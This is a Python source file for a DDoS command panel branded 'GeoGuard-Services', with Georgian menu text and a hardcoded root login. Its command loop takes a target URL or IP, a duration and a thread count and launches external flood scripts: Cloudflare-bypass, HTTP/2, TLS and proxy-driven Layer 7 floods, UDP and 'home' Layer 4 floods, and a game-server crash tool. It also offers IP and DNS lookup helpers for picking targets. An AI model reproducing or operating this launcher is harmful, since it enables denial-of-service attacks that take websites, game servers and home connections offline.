import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)


def ascii_vro():
    clear()
    print(f'''
    
█░░ █▀█ ▄▀█ █▀▄ █ █▄░█ █▀▀ ░ ░ ░
█▄▄ █▄█ █▀█ █▄▀ █ █░▀█ █▄█ ▄ ▄ ▄

 Loading…
█▒▒▒▒▒▒▒▒▒

    ''')
    time.sleep(0.6)
    clear()
    print(f'''  
    
█░░ █▀█ ▄▀█ █▀▄ █ █▄░█ █▀▀ ░ ░ ░
█▄▄ █▄█ █▀█ █▄▀ █ █░▀█ █▄█ ▄ ▄ ▄

10%
███▒▒▒▒▒▒▒
    ''')
    time.sleep(0.6)
    clear()
    print(f'''
    
█░░ █▀█ ▄▀█ █▀▄ █ █▄░█ █▀▀ ░ ░ ░
█▄▄ █▄█ █▀█ █▄▀ █ █░▀█ █▄█ ▄ ▄ ▄

30%
█████▒▒▒▒▒
    ''')
    time.sleep(0.6)
    clear()
    print(f'''
    
█░░ █▀█ ▄▀█ █▀▄ █ █▄░█ █▀▀ ░ ░ ░
█▄▄ █▄█ █▀█ █▄▀ █ █░▀█ █▄█ ▄ ▄ ▄

50%
███████▒▒▒
    ''')
    time.sleep(0.6)
    clear()
    print(f'''
    
█░░ █▀█ ▄▀█ █▀▄ █ █▄░█ █▀▀ ░ ░ ░
█▄▄ █▄█ █▀█ █▄▀ █ █░▀█ █▄█ ▄ ▄ ▄

100%
██████████



    ''')
    time.sleep(0.6)
    clear()
    print(f"""

█░░ █▀█ ▄▀█ █▀▄ █ █▄░█ █▀▀   █▀▀ █▀█ █▀▄▀█ █▀█ █░░ █▀▀ ▀█▀ █▀▀
█▄▄ █▄█ █▀█ █▄▀ █ █░▀█ █▄█   █▄▄ █▄█ █░▀░█ █▀▀ █▄▄ ██▄ ░█░ ██▄
    """)
    time.sleep(0.8)
    clear()

def si():
  
    print("")

def tools():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mTools     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mgeoip               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverse-dns           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverseip           \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255msubnet-lookup       \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255masn-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mdns-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
''')



def ports():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mPorts     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m21 - \x1b[38;2;0;255;255mSFTP       \x1b[38;2;0;212;14m69   - \x1b[38;2;0;255;255mTFTP      \x1b[38;2;0;212;14m5060  - \x1b[38;2;0;255;255mRIP  \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m22 - \x1b[38;2;0;255;255mSSH        \x1b[38;2;0;212;14m80   - \x1b[38;2;0;255;255mHTTP      \x1b[38;2;0;212;14m30120 - \x1b[38;2;0;255;255mFIVEM\x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m23 - \x1b[38;2;0;255;255mTELNET     \x1b[38;2;0;212;14m443  - \x1b[38;2;0;255;255mHTTPS                  \x1b[38;2;0;212;14m║   
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m25 - \x1b[38;2;0;255;255mSMTP       \x1b[38;2;0;212;14m3074 - \x1b[38;2;0;255;255mXBOX                   \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m53 - \x1b[38;2;0;255;255mDNS        \x1b[38;2;0;212;14m5060 - \x1b[38;2;0;255;255mPLAYSATION             \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝
''')

def layer7():
    clear()
    print(f'''



           
\x1B[32m		                ╔══════════════╗
\x1B[32m		                ║     𝕝𝕒𝕪𝕖𝕣𝟟   ║
\x1B[32m	        ╔═══════════════╩              ╩════════════════╗
\x1B[32m	        ║     \x1B[31mV̲I̲P̲                                       \x1B[32 ║ 
\x1B[32m                ║\x1B[33m👑 geoguardload                 \x1B[34m              \x1B[32m ║ 
\x1B[32m                ║\x1B[33m👑 tlsv3                        \x1B[34m              \x1B[32m ║
\x1B[32m                ║\x1B[33m👑 geoguardtls                  \x1B[34m              \x1B[32m ║
\x1B[32m                ║\x1B[33m👑 http2                        \x1B[34m              \x1B[32m ║ 
\x1B[32m	        ║\x1B[33m👑 paradox-tls                 \x1B[31m               \x1B[32m ║ 
\x1B[32m	        ║\x1B[33m👑 http-raw                   \x1B[35m                \x1B[32m ║ 
\x1B[32m	        ║\x1B[33m👑 socket                   \x1B[36m                  \x1B[32m ║
\x1B[32m   	        ║  \x1B[31mN̲o̲r̲m̲a̲l̲                                      \x1B[32m║  
                ║\x1B[37mCFBypass                                     \x1B[32m  ║
                ║\x1B[37mnormal-bypass                                \x1B[32m  ║
                ║\x1B[37mhttpsockets                                  \x1B[32m  ║
                ║\x1B[37mhttp-rand                                    \x1B[32m  ║
                ║\x1B[37mtls                                           \x1B[32m ║
                ║\x1B[37mhttp-fuzz                                     \x1B[32m ║
                ║\x1B[37msocketv4                                      \x1B[32m ║
                ╚═══════════════════════════════════════════════╝
                 



 

''')

def layer4():
    clear()

    si()
    print(f'''
 \x1B[32m		                ╔══════════════╗
\x1B[32m		                ║     𝕝𝕒𝕪𝕖𝕣𝟜   ║
\x1B[32m	        ╔═══════════════╩              ╩════════════════╗
\x1B[32m	        ║     \x1B[31mV̲I̲P̲                                       \x1B[32m║ 
\x1B[32m                ║\x1B[33m👑 <empty>                     \x1B[34m               \x1B[32m ║ 
\x1B[32m	        ║\x1B[33m👑 <empty>                     \x1B[31m               \x1B[32m ║ 
\x1B[32m	        ║\x1B[33m👑 <empty>                    \x1B[35m                \x1B[32m ║ 
\x1B[32m   	        ║   \x1B[31mN̲o̲r̲m̲a̲l̲                  \x1B[36m                   \x1B[32m║  
                ║\x1B[37mudp-god                                      \x1B[32m ║
                ║\x1B[37mhome-god                                     \x1B[32m ║
                ║\x1B[37m<empty>                                      \x1B[32m ║
                ║\x1B[37m<empty>                                      \x1B[32m ║
                ║\x1B[37m<empty>                                       \x1B[32m ║
                ║\x1B[37m<empty>                                       \x1B[32m ║
                ║\x1B[37m<empty>                                       \x1B[32m ║
                ╚═══════════════════════════════════════════════╝
''')

def amp_games():
    clear()
    si()
    print(f'''
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║\x1b[38;2;0;255;255m AMP's \x1b[38;2;0;212;14m/ \x1b[38;2;0;255;255mGames \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                    \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                  \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                    \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                  \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                    \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mgame-crash        \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
''')


def menu():
    sys.stdout.write(f"\x1b]2;GeoGurad --> | Online Users: [1] | Methods: [9] | Bypass: [3] | Amps: [1]\x07")
    clear()
 
    print("""
\033[32m      

▄▀ █▄▄ █▀▀ ▀█▀ ▄▀█   █░█ █▀▀ █▀█ █▀ █ █▀█ █▄░█ ▀▄
▀▄ █▄█ ██▄ ░█░ █▀█   ▀▄▀ ██▄ █▀▄ ▄█ █ █▄█ █░▀█ ▄▀
             ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


░██████╗░███████╗░█████╗░░██████╗░██╗░░░██╗░█████╗░██████╗░██████╗░░░░░░░░██████╗███████╗██████╗░██╗░░░██╗██╗░█████╗░███████╗░██████╗
██╔════╝░██╔════╝██╔══██╗██╔════╝░██║░░░██║██╔══██╗██╔══██╗██╔══██╗░░░░░░██╔════╝██╔════╝██╔══██╗██║░░░██║██║██╔══██╗██╔════╝██╔════╝
██║░░██╗░█████╗░░██║░░██║██║░░██╗░██║░░░██║███████║██████╔╝██║░░██║█████╗╚█████╗░█████╗░░██████╔╝╚██╗░██╔╝██║██║░░╚═╝█████╗░░╚█████╗░
██║░░╚██╗██╔══╝░░██║░░██║██║░░╚██╗██║░░░██║██╔══██║██╔══██╗██║░░██║╚════╝░╚═══██╗██╔══╝░░██╔══██╗░╚████╔╝░██║██║░░██╗██╔══╝░░░╚═══██╗
╚██████╔╝███████╗╚█████╔╝╚██████╔╝╚██████╔╝██║░░██║██║░░██║██████╔╝░░░░░░██████╔╝███████╗██║░░██║░░╚██╔╝░░██║╚█████╔╝███████╗██████╔╝
░╚═════╝░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░░░░░░░╚═════╝░╚══════╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝░╚════╝░╚══════╝╚═════╝░









            __| |___________________________________________| |__
          (__   _____________GEOGUARD-Services______________   __)
             | |                                            | |
             | |                                            | |
             | |    აკრიფეთ [help]  ბრძანებების სანახავად. | |             
             | |                                            | |
             | |                                            | |
             | |                                            | |
           __| |  __________________________________________| |__
          (__   ____________________________________________   __)
             | |                                            | |
               
""")

def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;2;0;212;14m💀 Pentesting\x1B[36m@\x1B[31mGeoGuard\x1b[38;2;0;186;45m\x1b[38;2;0;186;45m\x1b[38;2;0;186;45m\x1b[38;2;0;186;45m\x1b[38;2;0;186;45m\x1b[38;2;0;186;45m═\x1b[38;2;0;186;45m➤ \x1b[38;2;239;239;239m''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "amp/games" or cnc == "AMP/GAMES" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            amp_games()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            tools()
        
        elif "normal-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node httpbypassv2.js {url} {time}')
            except IndexError:
                print('Usage: normal-bypass <url> <time>')
                print('Example: normal-bypass http://example.com 20')

        elif "cf-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                os.system(f'node cf.js {url} {time} {threads}')
            except IndexError:
                print('Usage: cf-bypass <url> <time> <threads>')
                print('Example: cf-bypass http://example-cloud.com 20 15')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                method = cnc.split()[3]
                os.system(f'node HTTP-RAW.js {url} {time} {method}')
            except IndexError:
                print('Usage: https-raw <url> <time> <GET/POST/HEAD>')
                print('Example: http-raw http://example.com 20 POST')

        elif "http-dstat" in cnc:
            try:
                url = cnc.split()[1]
                connections = cnc.split()[2]
                rps = cnc.split()[3]
                os.system(f'perl dstat.pl {url} {connections} {rps} 13.87')
            except IndexError:
                print('Usage: http-dstat <url> <connections> <rps>')
                print('Example: http-dstat http://example.org 50000 50000')


        elif "geoip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: geoip <ip>')
                print('Example: geoip 1.1.1.1')

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')

        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')
 
        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')

        elif "dns-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns-lookup <dns>')
                print('Example: dns-lookup google.com')

        elif "reverse-dns" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')                

        elif "http-fuzz" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node httpfuzz.js {url} proxies.txt {time} POST')
            except IndexError:
                print(f'Usage: http-fuzz <url> <time>')
                print("Example: http-fuzz http://sexo.org 30")


        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print("Usage: http-rand <url> <time>")
                print("Example: http-rand http://si.com 10")

        elif "CFBypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f"node CFBypass.js {url} {time}")
            except IndexError:
                print("Usage: CFBypass <url> <time>")
                print("Example: CFBypass https://si.com 500")
        
        elif "tlsv3" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                reqs = cnc.split()[3]
                threads = cnc.split()[4]
                os.system(f"node tlsv3.js {url} {time} {reqs} {threads} proxy.txt")
            except IndexError:
                print("Usage: tlsv3 <url> <time> <reqs> <threads>")
                print("Example: tlsv3 https://example.com 500 64 15")
        
        
        elif "geoguardtls" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f"node geoguard_tls.js {url} {time}")
            except IndexError:
                print("Usage: geoguardtls <url> <time>")
                print("Example: geoguardtls https://si.com 500")
                
                
        elif "geoguardload" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                reqs = cnc.split()[3]
                threads = cnc.split()[4]
                os.system(f"node geoguard_load.js {url} {time} {reqs} {threads}")
            except IndexError:    
                print(f'Usage: geoguardload <host> <time> <reqs> <threads>')
                print(f'Example: geoguardload https://example.com 500 64 15')     
  
                
        elif "paradox-tls" in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                os.system(f"node paradox-tls.js get {url} proxies.txt 999999 64 {threads}")    
                os.system(f"node paradox-tls.js {url} proxies.txt 999999 64 200")
            except IndexError:
                print("Usage: paradox-tls <url> <threads>")
                print("Example: paradox-tls https://si.com 200")          
                
                
                
        elif "http2" in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                os.system(f"node http2.js get {url} proxies.txt 500 500 {threads}")    
                os.system(f"node http2.js get {url} proxies.txt 500 500 200")
            except IndexError:
                print("Usage: http2 <url> <threads>")
                print("Example: http2 https://si.com 200")            
                  
        elif "socket" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'sudo ./socket {url} {time}')
            except IndexError:
                print('Usage: socket <url> <time>')
                print("Example: socket http://example.com 500") 
                
        elif "tls" in cnc:
            try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
                 os.system(f"node tls.js {url} {time}")
            except IndexError:    
                print(f'Usage: tls <host> <time>')
                print(f'Example: tls http://example.org 500')                  

                
        elif "udp-god" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                throttle = cnc.split()[4]
                time = cnc.split()[5]
                os.system(f'sudo ./udp {ip} {port} {threads} {throttle} {time}')
            except IndexError:
                print(f'Usage: udp-god <ip> <port> <threads> <throttle> <time>')
                print(f'Example: udp-god 1.1.1.1 80 30 40000 30')


        elif "home-god" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                psize = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'perl home.pl {ip} {port} {psize} {time}')
            except IndexError:
                print(f'Usage: home-god <ip> <port> <packet_size> <time>')
                print(f'Example: home-god 1.1.1.1 80 1024 50')


        elif "socketv4" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                reqs = cnc.split()[3]
                os.system(f"node socketv4.js {url} proxies.txt {time} {reqs}")
            except IndexError:    
                print(f'Usage: socketv4 <host> <proxy> <time> <reqs>')
                print(f'Example: socketv4 http://example.org 500 500')
            
        elif "httpsockets" in cnc:
            try:
                url = cnc.split()[1]
                reqs = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f"node HTTP-SOCKETS.js {url} {reqs} {time}")          
            except IndexError:    
                print(f'Usage: httpsockets <host> <reqs> <time>')
                print(f'Example: httpsockets http://example.org 500 500')
            

        elif "game-crash" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'sudo ./GAME-CRASH {ip} {port}')
            except IndexError:
                print('Usage: game-crash <ip> <port>')
                print('Example: game-crash 192.168.0.1 22')

        elif "cloudflare-lag" in cnc:
            print('Method "CLOUDFLARE-LAG" not enabled')

        elif "help" in cnc:
            print(f''' \033[32m
            

██╗░░██╗███████╗██╗░░░░░██████╗░
██║░░██║██╔════╝██║░░░░░██╔══██╗
███████║█████╗░░██║░░░░░██████╔╝
██╔══██║██╔══╝░░██║░░░░░██╔═══╝░
██║░░██║███████╗███████╗██║░░░░░
╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░░░░
\x1B[31mlayer7   > Layer 7 შეტევის მეთოდი
\x1B[33mlayer4   > Layer 4 შეტევის მეთოდი
\x1B[36mports    > პორტის ნახვა
\x1B[37mcls      > ტერმინალის გასუფთავება
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():

    clear() 
    print(f'''
    
██╗░░░░░░█████╗░░██████╗░██╗███╗░░██╗
██║░░░░░██╔══██╗██╔════╝░██║████╗░██║
██║░░░░░██║░░██║██║░░██╗░██║██╔██╗██║
██║░░░░░██║░░██║██║░░╚██╗██║██║╚████║
███████╗╚█████╔╝╚██████╔╝██║██║░╚███║
╚══════╝░╚════╝░░╚═════╝░╚═╝╚═╝░░╚══╝

█░█░█ █▀▀ █░░ █▀▀ █▀█ █▀▄▀█ █▀▀   ▀█▀ █▀█   █▀▀ █▀▀ █▀█ █▀▀ █░█ ▄▀█ █▀█ █▀▄
▀▄▀▄▀ ██▄ █▄▄ █▄▄ █▄█ █░▀░█ ██▄   ░█░ █▄█   █▄█ ██▄ █▄█ █▄█ █▄█ █▀█ █▀▄ █▄▀
    ''')    
    user = "root"
    passwd = "a"
    username = input("</> Admin: ")
    password = getpass.getpass(prompt='</> Password: ')
    if username != user or password != passwd:
        print("")
        print("</> Invalid credentials! Abandoning...")
        sys.exit(1)
    elif username == user and password == passwd:
 
        time.sleep(0.3)
        ascii_vro()
        main()

login()
